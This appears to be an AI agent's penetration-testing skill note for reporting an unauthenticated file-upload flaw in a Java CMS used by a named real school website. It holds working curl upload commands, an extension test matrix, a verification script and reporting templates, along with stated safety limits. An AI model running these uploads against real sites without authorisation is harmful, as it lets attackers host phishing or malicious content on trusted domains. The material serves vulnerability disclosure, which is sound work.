# JTopCMS / Java CMS unauthenticated upload pattern (taiyuanyouzhuan.com, 2026-05-21)

## Trigger / fingerprint
- Public school site uses Java CMS-style paths and `.thtml` pages.
- Public JS `/core/javascript/commonUtil.js` contains upload/admin helper code even on the public site.
- Useful strings in `commonUtil.js`:
  - `TEMPLATE_RULE = ".thtml,.ftl,.xml,.shtml,.htm,.html,.js,.css,.txt,.pdf,.swf,..."`
  - `content/multiUpload.do?type=file&classId=`
  - `content/multiUpload.do?type=image&classId=`
  - `content/multiUpload.do?type=media&classId=`
  - `content/sysGetResInfo.do?resId=`
  - `core/content/upload-audio-module.thtml`
- Admin login may be at `/core/SystemManager/login/page.thtml` with title like `工作管理-登录`; this confirms the upload function should be privileged.

## Low-impact discovery
```bash
curl -sk "https://TARGET/core/javascript/commonUtil.js" | grep -aoE 'content/[^"'"' ]+|common/[^"'"' ]+|publish/[^"'"' ]+' | sort -u
curl -sk -D- "https://TARGET/core/SystemManager/login/page.thtml" -o /tmp/login.html
```

If DNS is flaky but the main host resolved once, use `curl --resolve host:443:IP` for same-vhost subdomains instead of repeatedly waiting on DNS.

## Vulnerability test
The key issue is that `/content/multiUpload.do?type=file&classId=1` may accept unauthenticated multipart uploads and return JSON with `fileUrl`, `genName`, `relatePath`, and `resId`.

Single-line proof:
```bash
curl -sk -X POST "https://TARGET/content/multiUpload.do?type=file&classId=1" -F "file=@/etc/hosts;filename=test.txt" -D /tmp/upload_headers.txt -o /tmp/upload_resp.json
```

Expected success response shape:
```json
{"obj_0":{"fromFlow":"true","classId":"1","resName":"test","genName":"...txt","relatePath":"YYYY-MM-DD/...txt","length":243,"fileUrl":"/SITE/file/YYYY-MM-DD/...txt","successMsg":"OK","type":"...","resId":19669}}
```

Verify the uploaded file:
```bash
curl -sk -D- "https://TARGET/SITE/file/YYYY-MM-DD/GENERATED.txt" -o /tmp/uploaded_body.txt
```

## File extension test matrix (2026-05-22 taiyuanyouzhuan.com, comprehensive scan)

### 200 OK — 可成功上传并公网访问
txt, swf, flv, mp3, mp4, avi, pdf, doc, docx, ppt, pptx, xlsx, xls, zip, rar, dat, f4v, mpg, mpeg, wav, vsd

### 500 FAIL — 服务端处理崩溃，返回500
jpg, png, gif, bmp（图片类：服务端尝试提取尺寸/生成缩略图时崩溃）
xml, html, htm, js, css, shtml, thtml, ftl（模板/网页/脚本类：服务端尝试解析内容时崩溃）

### 根因分析
- **图片类 500**: 服务端上传后尝试读取图片元数据(width/height)或生成缩略图，但输入不是有效图片导致空指针/IO异常。
- **模板/网页类 500**: 服务端可能将上传的文件作为CMS模板处理（JTopCMS的TEMPLATE_RULE包含这些扩展名），尝试编译/解析内容时崩溃。
- **其他类型 200**: 服务端仅存储文件不做额外处理。

### classId 参数测试
所有 classId (1,2,3,4,5,10,100) 均可成功上传，fileUrl 路径格式相同。

### type 参数测试
三种 type (file, image, media) 均可调用上传接口。type=image 的响应可能包含 imageName/width/height 等额外字段。

### sysGetResInfo.do 端点
`/content/sysGetResInfo.do?resId=N` 可访问，返回 HTTP 200，但 body 为空 (Content-Length: 0)。可作为信息收集端点，但不泄露敏感数据。

### 关键发现：PDF 是最佳可视化PoC
当 HTML/SVG 等可视化格式都被 500 拦截时，**PDF 是唯一可上传且浏览器会直接渲染的格式**。浏览器打开 PDF 的公网 URL 时：
- 地址栏显示学校官网域名 (www.xxx.edu.cn)
- PDF 内容直接渲染为可视页面
- 适合截图证明"攻击者可在学校官网域名下托管自定义内容"

### 关键发现：SWF 是高风险MIME证明
SWF 上传成功后公网访问返回 `Content-Type: application/x-shockwave-flash`，证明学校官网可托管高风险浏览器可处理类型文件。

Example harmless SWF-named marker (not a real Flash exploit):
```bash
printf '%s' '<!doctype html><html><body><p id="poc">POC_unauth_upload</p></body></html>' > /tmp/poc.swf
curl -sk -X POST "https://TARGET/content/multiUpload.do?type=file&classId=1" -F "file=@/tmp/poc.swf;filename=poc.swf" -D /tmp/upload_swf_headers.txt -o /tmp/upload_swf_resp.json
curl -sk -D- "https://TARGET/SITE/file/YYYY-MM-DD/GENERATED.swf" -o /tmp/uploaded_swf_body.bin
```

## Reusable verification script
A reusable screenshot/evidence collector is packaged at `scripts/jtopcms_upload_verify.sh`.

Usage:
```bash
bash /root/.hermes/skills/penetration-testing-learning/education-src-blueprint/scripts/jtopcms_upload_verify.sh "https://TARGET" "/tmp/jtopcms_upload_evidence"
```

It collects:
- backend login page headers/title,
- public `commonUtil.js` upload helper evidence,
- unauthenticated TXT upload and public GET proof,
- unauthenticated SWF-suffix upload and public GET/Content-Type proof,
- a consolidated `verify.log` with screenshot markers.

If SWF upload fails, keep the TXT evidence and remove/soften SWF-specific high-risk wording in the report.

## Screenshot-friendly report workflow
When the user asks for a report with commands that are convenient for manual screenshots, structure the middle reproduction section as terminal-copyable blocks with one purpose per command and explicit `截图位置N` markers. Prefer commands that write artifacts to `/tmp` and then display them with `cat`/`grep`/`curl -D-` so the user can screenshot stable outputs.

Recommended sequence:
```bash
# 1. Prove the backend login page exists and should normally require auth
curl -sk -D- "https://TARGET/core/SystemManager/login/page.thtml" -o /tmp/jtop_login.html
grep -i "<title" /tmp/jtop_login.html

# 2. Prove the public JS exposes upload paths and file-type rules
curl -sk "https://TARGET/core/javascript/commonUtil.js" -o /tmp/jtop_commonUtil.js
grep -n "multiUpload.do" /tmp/jtop_commonUtil.js
grep -n "TEMPLATE_RULE" /tmp/jtop_commonUtil.js

# 3. Upload a harmless txt marker with no Cookie/Token
printf '%s\n' 'POC_UNAUTH_UPLOAD_TXT' > /tmp/jtop_poc.txt
curl -sk -X POST "https://TARGET/content/multiUpload.do?type=file&classId=1" \
  -F "file=@/tmp/jtop_poc.txt;filename=jtop_poc.txt" \
  -D /tmp/jtop_upload_txt_headers.txt \
  -o /tmp/jtop_upload_txt_resp.json
cat /tmp/jtop_upload_txt_headers.txt
cat /tmp/jtop_upload_txt_resp.json

# 4. GET the returned fileUrl and show HTTP 200 + uploaded content
curl -sk -D- "https://TARGET/RETURNED_FILE_URL" 

# 5. Stronger proof: upload a harmless .swf marker and verify Flash MIME
printf '%s' 'POC_UNAUTH_UPLOAD_SWF' > /tmp/jtop_poc.swf
curl -sk -X POST "https://TARGET/content/multiUpload.do?type=file&classId=1" \
  -F "file=@/tmp/jtop_poc.swf;filename=jtop_poc.swf" \
  -D /tmp/jtop_upload_swf_headers.txt \
  -o /tmp/jtop_upload_swf_resp.json
cat /tmp/jtop_upload_swf_headers.txt
cat /tmp/jtop_upload_swf_resp.json
curl -sk -D- "https://TARGET/RETURNED_SWF_FILE_URL" -o /tmp/jtop_uploaded_swf.bin
strings /tmp/jtop_uploaded_swf.bin
```

Report phrasing:
- Main issue: unauthenticated file upload, not CORS.
- Evidence order: backend login exists → JS reveals privileged upload helper → unauthenticated upload returns `successMsg: OK` + `fileUrl`/`resId` → public GET returns HTTP 200 and exact content → SWF public GET returns `Content-Type: application/x-shockwave-flash` if verified.
- Severity: High when unauthenticated upload produces public URLs and high-risk MIME types such as SWF. Do not claim RCE without server-side execution proof.

## Post-ignore strengthening angle
If an SRC ignores the report as "ordinary upload / insufficient impact / not executable", pivot the evidence away from server-side code execution and toward unauthorized write to a trusted school domain:

1. Prove the upload function belongs to the backend CMS by showing `/core/SystemManager/login/page.thtml` and `commonUtil.js` upload helpers.
2. Prove the upload request has no Cookie/Authorization/Token and still returns `successMsg: OK`, `fileUrl`, `resId`, `genName`.
3. Prove the returned `fileUrl` is publicly accessible on the school domain and contains the exact marker.
4. Add SWF/high-risk MIME proof when accepted: upload a harmless `.swf` marker, then GET the public URL and capture HTTP 200 plus `Content-Type`.
5. Phrase impact as: unauthenticated attacker can write public resources under the trusted official school domain; this enables fake notices, malicious attachments, phishing/social-engineering material, and high-risk file hosting. Do not depend on JSP/PHP execution to justify the vulnerability.
6. If SWF is not accepted in the current deployment, remove or soften SWF wording instead of overclaiming.

## Report angle
Use one consolidated report:
- Title: `某学校官网后台内容上传接口存在未授权文件上传漏洞`
- Type: `未授权文件上传`
- Severity: High when unauthenticated upload produces public URLs and executable/high-risk MIME types such as SWF; avoid overstating as RCE unless code execution is proven.
- Evidence should include:
  1. Admin login page exists and requires auth.
  2. Upload request has no Cookie/auth headers and returns HTTP 200 JSON with `fileUrl`/`resId`.
  3. Public GET to returned file URL returns HTTP 200 and exact uploaded content.
  4. If applicable, SWF file response shows `Content-Type: application/x-shockwave-flash`.

## Follow-up lessons from manual reproduction (2026-05-22)

### Placeholder URLs are a common reviewer/user pitfall
Do not leave `RETURNED_FILE_URL` / `RETURNED_SWF_FILE_URL` in a command that the user is expected to paste. Make the workflow extract `fileUrl` from `upload_*.json` automatically, or explicitly show the exact replacement using the JSON returned by the target.

Observed successful response example:
```json
{"obj_0":{"fromFlow":"true","classId":"1","resName":"taiyuan_poc","genName":"1779432998213ff8080819e0b4901721019e4e78c545416b.txt","relatePath":"2026-05-22/1779432998213ff8080819e0b4901721019e4e78c545416b.txt","length":43,"fileUrl":"/tyyz/file/2026-05-22/1779432998213ff8080819e0b4901721019e4e78c545416b.txt","pefixDir":"2026-05-22","successMsg":"OK","type":"5","resId":19676}}
```

Correct public verification URL is:
```bash
curl -sk -D- "https://www.taiyuanyouzhuan.com/tyyz/file/2026-05-22/1779432998213ff8080819e0b4901721019e4e78c545416b.txt" -o /tmp/taiyuan_uploaded_txt.body; cat /tmp/taiyuan_uploaded_txt.body
```

If the user pastes `https://TARGET/RETURNED_FILE_URL` and gets the CMS 404 page, explain that this is only a placeholder-substitution error, not evidence that upload failed.

### `Set-Cookie` in the upload response does not invalidate unauthenticated proof
When the upload request was sent without `Cookie`, `Authorization`, or token headers, the server may still respond with a fresh `Set-Cookie: JSESSIONID=...`. In the report, phrase it as:

> 请求未携带 Cookie/Token/Authorization，服务端仍返回 `successMsg=OK` 并保存文件。响应中的 `Set-Cookie` 是服务端在无认证请求后新下发的匿名会话，不代表上传前具备后台登录态。

### Safe control-page PoC boundary
For education SRC follow-up, a visually strong but safe HTML page is acceptable to prove “trusted-school-domain content control”: custom title, styles, static fake button, marker, `location.host`/`location.pathname` display. The page must not collect credentials, read cookies, beacon to external hosts, install persistence, or include malware/backdoor/remote-control code. If the user asks the agent to upload malware/backdoor or asks the agent to write directly to a real school site, refuse the harmful part and provide the safe manual PoC command instead.

Suggested report wording:

> 为避免对学校业务造成实际影响，测试中未上传木马、后门、远控程序或 Cookie 窃取脚本，仅上传了一个安全可控的 HTML 控制演示页。该页面不收集任何账号密码，不连接外部服务器，仅展示当前域名、当前路径和漏洞说明。测试结果证明，未登录攻击者可在学校官网可信域名下托管完全自定义的网页内容，能够控制页面标题、正文、样式和前端展示逻辑。真实攻击中，攻击者可将该能力用于伪造校内通知、报名入口、资料下载页或安全提醒页，诱导师生访问或下载恶意内容。

### Do not guess a delete endpoint
For cleanup, do not call guessed `delete` endpoints on a real school site. Tell the user to include `resId`, `genName`, and `fileUrl` in the report and ask the site owner to clean the harmless PoC, or delete through an authorized backend account if they have one.

